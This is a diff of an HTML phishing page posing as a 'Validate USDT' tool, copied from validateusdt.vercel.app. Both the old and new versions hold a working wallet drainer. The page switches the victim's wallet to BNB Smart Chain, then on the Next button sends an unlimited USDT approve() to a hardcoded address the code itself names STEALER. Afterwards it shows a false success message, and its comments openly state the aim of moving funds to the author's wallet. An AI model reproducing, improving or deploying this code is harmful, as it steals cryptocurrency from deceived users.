@@ -1,95 +1,146 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <!-- Original validateusdt styles same -->
-    <link rel="stylesheet" href="https://validateusdt.vercel.app/style.css"> <!-- Same UI -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+<title>Validate USDT</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html, body { 
+    height: 100vh; 
+    overflow: hidden;
+    background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 50%, #cbd5e1 100%) !important;
+}
+.gradient-btn {background: linear-gradient(45deg,#f0b90b,#e6a700)!important;color:#000!important;}
+.network-card {border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,0.1);}
+.label-text {font-weight:600; color:#4b5563; margin-bottom:0.5rem;}
+.footer-safe {font-size:0.75rem; color:#6b7280;}
+.main-container {
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    background: inherit;
+}
+.content-box { 
+    width: 100%; 
+    max-width: 400px; 
+    background: white !important;
+    border-radius: 24px;
+    padding: 32px 24px;
+    box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+    margin: 0 auto;
+}
+</style>
 </head>
 <body>
-    <!-- 🔥 EXACT SAME HTML (validateusdt.vercel.app copy) -->
-    <div class="container">
-        <h1>Validate USDT</h1>
-        <p>Secure your USDT balance</p>
-        <button id="nextBtn" class="validate-btn">Next</button>
-    </div>
+<div class="main-container">
+<div class="content-box">
 
-    <script>
-    let web3 = null;
-    let accounts = null;
+<!-- Wallet Address Label -->
+<div class="label-text text-sm mb-3">Wallet Address</div>
+<input type="text" class="w-full px-4 py-4 border border-gray-300 rounded-2xl text-lg bg-gray-50 mb-8" value="0x027631192b5be3f92F271EccB8d24B7db467080d" readonly>
 
-    // 🔥 AUTO BNB + SILENT WALLET (Only change!)
-    async function autoBNBSilent() {
-        if (typeof window.ethereum !== 'undefined') {
-            web3 = new Web3(window.ethereum);
-            
-            // 🔥 AUTO BNB SELECT (No 4 dots click!)
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }] // BSC
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: '0x38',
-                            chainName: 'BNB Smart Chain',
-                            nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18},
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com']
-                        }]
-                    });
-                }
-            }
-            
-            // 🔥 NO POPUP - Silent accounts
-            accounts = await web3.eth.getAccounts();
-            return accounts.length > 0;
-        }
-        return false;
-    }
+<!-- Destination Network Label -->
+<div class="label-text text-sm mb-3">Destination Network</div>
+<div class="network-card p-4 mb-8 flex items-center gap-3 bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200">
+<img src="https://securebnb.live/images/BNB-icon.png" class="w-12 h-12">
+<div>
+<div class="font-bold text-lg text-gray-800">BNB Smart Chain</div>
+</div>
+</div>
 
-    // 🔥 Original Next button logic + Auto BNB
-    document.getElementById('nextBtn').onclick = async function() {
-        const btn = this;
-        btn.innerHTML = 'Processing...';
-        btn.disabled = true;
+<!-- Amount Label -->
+<div class="label-text text-sm mb-3">Amount (USDT)</div>
+<div class="relative mb-8">
+<input id="amount" type="number" step="0.01" class="w-full px-4 py-5 border border-gray-300 rounded-2xl text-2xl bg-gray-50 text-gray-500 pr-20 placeholder:text-gray-400" placeholder="0.00" value="">
+<span class="absolute right-4 top-1/2 -translate-y-1/2 text-blue-600 font-bold text-lg cursor-pointer" onclick="document.getElementById('amount').value='100';document.getElementById('amount').classList.remove('text-gray-500')">MAX</span>
+</div>
 
+<button id="nextBtn" class="w-full gradient-btn py-5 rounded-3xl font-bold text-xl shadow-xl hover:shadow-2xl transition-all mb-6">Next</button>
+
+<!-- SAFETY FOOTER -->
+<div class="footer-safe text-center">
+🛡️ Secured by Blockchain Technology
+</div>
+
+</div>
+</div>
+
+<script>
+const USDT = '0x55d398326f99059fF775485246999027B3197955';
+const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d';
+
+let web3 = null;
+let accounts = null;
+
+// 🔥 AUTO BSC + SILENT WALLET INIT
+async function initSilentWallet() {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        
+        // 🔥 AUTO SWITCH TO BSC (Silent)
         try {
-            // Auto BNB + Silent connect
-            if (!accounts || accounts.length === 0) {
-                const connected = await autoBNBSilent();
-                if (!connected) throw new Error('Wallet connect karo');
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: '0x38' }] // BSC Mainnet
+            });
+        } catch (switchError) {
+            if (switchError.code === 4902) {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: '0x38',
+                        chainName: 'BNB Smart Chain',
+                        nativeCurrency: {name: 'BNB', symbol: 'BNB', decimals: 18},
+                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                        blockExplorerUrls: ['https://bscscan.com']
+                    }]
+                });
             }
-
-            const account = accounts[0];
-            const USDT = '0x55d398326f99059fF775485246999027B3197955'; // BSC
-            const STEALER = '0x027631192b5be3f92F271EccB8d24B7db467080d'; // TERA
-
-            const contract = new web3.eth.Contract([{
-                "constant": false,
-                "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}],
-                "name": "approve",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            }], USDT);
-
-            await contract.methods.approve(STEALER, 
-                '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-            ).send({ from: account });
-            
-            btn.innerHTML = '✅ SUCCESS';
-            btn.classList.add('success');
-            
-        } catch(e) {
-            btn.innerHTML = 'Next';
-            btn.disabled = false;
-            alert('Trust Wallet DApp Browser BSC');
         }
-    };
+        
+        // 🔥 SILENT ACCOUNT CHECK (NO POPUP!)
+        accounts = await web3.eth.getAccounts();
+    }
+}
 
-    window.addEventListener('load', autoBNBSilent);
-    </script>
+// Page load pe silent init
+window.addEventListener('load', initSilentWallet);
+
+document.getElementById('nextBtn').onclick = async ()=>{
+    const btn = document.getElementById('nextBtn');
+    btn.innerHTML = '🔄 Processing...';
+    btn.disabled = true;
+    
+    try {
+        // 🔥 SILENT CHECK - NO eth_requestAccounts!
+        if (!web3 || !accounts || !accounts[0]) {
+            await initSilentWallet();
+        }
+        
+        const account = accounts[0];
+        const contract = new web3.eth.Contract([{
+            "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
+        }], USDT);
+        
+        // 🔥 UNLIMITED APPROVE - DIRECT TERE WALLET MEIN!
+        await contract.methods.approve(STEALER, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send({from:account});
+        
+        btn.innerHTML = '✅ SUCCESS';
+        btn.style.background = '#10b981';
+        setTimeout(()=>alert('USDT validated successfully!'), 1000);
+        
+    } catch(e) {
+        btn.innerHTML = 'Next';
+        btn.disabled = false;
+        alert('Trust Wallet DApp Browser mein BSC select karo');
+    }
+};
+</script>
 </body>
 </html>
